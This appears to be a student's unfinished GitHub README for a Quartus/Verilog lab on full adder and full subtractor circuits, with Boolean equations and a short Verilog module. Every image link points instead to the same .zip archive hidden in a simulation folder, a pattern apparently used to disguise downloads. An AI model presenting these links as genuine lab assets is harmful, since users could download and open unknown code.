# FULL_ADDER_SUBTRACTOR

Implementation-of-Full-Adder-and-Full-subtractor-circuit

**AIM:**

To design a Full Adder and Full Subtractor circuit and verify its truth table in Quartus using Verilog programming.

**Equipments Required:**

Hardware – PCs, Cyclone II , USB flasher

Software – Quartus prime

**Full Adder and Full Subtractor**

**Full Adder**

Full adder is a digital circuit used to calculate the sum of three binary bits. It consists of three inputs and two outputs. Two of the input variables, denoted by A and B, represent the two significant bits to be added. The third input, Cin, represents the carry from the previous lower significant position. Two outputs are necessary because the arithmetic sum of three binary digits ranges in value from 0 to 3, and binary 2 or 3 needs two digits. The two outputs are sum and carry.

Sum =A’B’Cin + A’BCin’ + ABCin + AB’Cin’ = A ⊕ B ⊕ Cin 

Carry = AB + ACin + BCin

![image](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)

**Figure -1 FULL ADDER**

**Full Subtractor**

A full subtractor is a combinational circuit that performs subtraction involving three bits, namely minuend, subtrahend, and borrow-in . It accepts three inputs: minuend, subtrahend and a borrow bit and it produces two outputs: difference and borrow.

![image](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)

Diff = A ⊕ B ⊕ Bin 

Borrow out = A'Bin + A'B + BBin

**Truthtable**

**Procedure**

Write the detailed procedure here

**Program:**
```
/* Program to design a half subtractor and full subtractor circuit and verify its truth table in quartus using Verilog programming.
Developed by:shaik hazeedmasthan
RegisterNumber:212224040304
*/
```

```
module fulladd_top(a,b,c,sum,carry,BO,DIFF);
input a,b,c;
output sum,carry,BO,DIFF;
assign sum=a^b^c;
assign carry= a&b | a&c | b&c;
wire a0;
not (a0,a);
assign BO= b&c | a0&c | a0&b;
assign DIFF=a^b^c;
endmodule

```
**RTL Schematic**
![318706159-254361e2-8d56-499e-a9f6-78a87bfe730f](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)

**Output Timing Waveform**
![318706218-41a89d30-bde2-44fa-809b-3683dee78211](https://raw.githubusercontent.com/24013396/FULL_ADDER_SUBTRACTOR/main/simulation/qsim/work/@f@u@l@l_addsub/FULL_ADDER_SUBTRACTOR_v3.6.zip)

**Result:**

Thus the Full Adder and Full Subtractor circuits are designed and the truth tables is verified using Quartus software.



